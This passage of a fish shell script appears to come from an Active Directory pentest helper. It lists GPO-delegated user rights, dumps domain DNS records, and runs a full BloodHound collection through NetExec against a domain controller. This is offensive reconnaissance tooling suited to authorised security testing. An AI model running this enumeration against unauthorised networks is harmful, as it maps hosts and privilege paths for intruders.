            count = split(rest, principals, ", ")
            keep = ""
            for (i = 1; i <= count; i++) {
                p = principals[i]
                gsub(/^[ \t]+|[ \t]+$/, "", p)
                if (p == "") continue

                key = tolower(p)
                if (index(key, "builtin") == 1) key = substr(key, 9)

                if (p ~ /^S-1-/ || (key in builtin)) {
                    hidden++
                    continue
                }
                keep = keep (keep == "" ? "" : ", ") p
            }

            if (keep != "") {
                if (!seen[gpo]) {
                    print gpo
                    seen[gpo] = 1
                }
                print priv ": " keep
                found = 1
            }
        }
        END {
            if (!found) print "NO_CUSTOM"
            else if (hidden > 0) print "HIDDEN " hidden
        }')
    if test $gpp_priv_rc -eq 124
        ezpz_warn "Operation timed out. Skipping."
    else if contains -- NO_CUSTOM $gpp_priv_output
        printf '%s\n' "No custom GPO-delegated user rights found."
    else if test -n "$gpp_priv_output"
        for line in $gpp_priv_output
            if string match -q 'HIDDEN *' -- $line
                set -l hidden (string replace -r '^HIDDEN ' '' -- $line)
                ezpz_info "$hidden default assignment(s) hidden."
            else
                echo $line
            end
        end
    else
        printf '%s\n' "No custom GPO-delegated user rights found."
    end
    rm -f $gpp_priv_tmp

    echo
    ezpz_title "Collecting domain data..."

    # DNS enumeration using nxc get-network (replaces bloodyAD dnsDump).
    # get-network writes its records to a timestamped log under ~/.nxc/logs
    # and prints the path; extract that path and render a hostname/IP table.
    echo
    ezpz_header "Enumerating DNS records"
    ezpz_cmd "nxc ldap $nxc_auth -M get-network -o ALL=true"
    set -l dns_tmp (mktemp)
    ezpz_spin_capture $dns_tmp nxc ldap $nxc_auth -M get-network -o ALL=true
    set -l dns_rc $status
    set -l dns_log (grep -aoE '/[^ ]+_network_[^ ]+\.log' $dns_tmp | tail -1)
    if test $dns_rc -eq 124
        ezpz_warn "Operation timed out. Skipping."
    else if test -n "$dns_log" -a -f "$dns_log" -a -s "$dns_log"
        printf "%-40s %s\n" "HOSTNAME" "IP ADDRESS(ES)"
        printf "%-40s %s\n" "--------" "-------------"
        awk -F'\t' '
        {
            gsub(/^[ \t]+|[ \t]+$/, "", $1)
            gsub(/^[ \t]+|[ \t]+$/, "", $2)
            if ($1 ~ /^@\./ || $1 == "" || $2 == "") next
            printf "%-40s %s\n", $1, $2
        }' "$dns_log"
    else
        printf '%s\n' "No DNS records returned."
    end
    rm -f $dns_tmp

    echo
    ezpz_header "Starting BloodHound data collection"

    # Keep this step quiet: nxc is extremely verbose here and none of its
    # output is actionable on success. Only report the saved file or a
    # concise error.
    set bh_tmp (mktemp)
    ezpz_spin_capture $bh_tmp nxc ldap $nxc_auth --bloodhound --collection All --dns-server $dc_ip
    set bh_status $status
    # -a is required because nxc can emit NUL bytes from LDAP errors.
    set zip_path (grep -aoE '[^[:space:]]+_bloodhound\.zip' $bh_tmp | tail -1)
    if test -n "$zip_path" -a -f "$zip_path"
        set dest_zip "./$file_domain"_bloodhound.zip
        mv $zip_path $dest_zip
        ezpz_info "Saving BloodHound data to $dest_zip"

        # Remove JSON files created by the collector in the current directory.
        find . -maxdepth 1 -name "*.json" -mmin -1 -delete 2>/dev/null
        find . -maxdepth 1 -name "*_*_*_*_*.json" -delete 2>/dev/null
    else
        ezpz_error "BloodHound collection failed (status $bh_status)."
        tr -d '\0' < $bh_tmp \
            | grep -aE '\[-\]|Error|Traceback|noSuchObject|KDC_ERR' \
            | tail -n 3
    end
    rm -f $bh_tmp

    echo
    ezpz_success "Done."
end
